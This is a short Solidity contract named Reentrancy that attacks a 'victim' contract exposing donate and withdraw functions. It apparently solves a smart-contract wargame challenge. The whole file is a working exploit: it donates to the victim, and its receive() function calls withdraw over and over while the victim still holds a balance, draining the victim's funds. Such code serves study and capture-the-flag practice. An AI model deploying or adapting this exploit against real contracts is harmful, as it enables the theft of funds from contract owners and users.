// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.7;

interface ReentranceInterface {
    function withdraw(uint _amount) external;
    function donate(address _to) external payable;
}

contract Reentrancy {
    address public victim;

    constructor(address _victim) {
        victim = _victim;
    }

    function donate() public payable {
        ReentranceInterface(victim).donate{ value: msg.value }(address(this));
    }

    receive() external payable {
        if(victim.balance > 0) {
            ReentranceInterface(victim).withdraw(msg.value);
        }
    }
}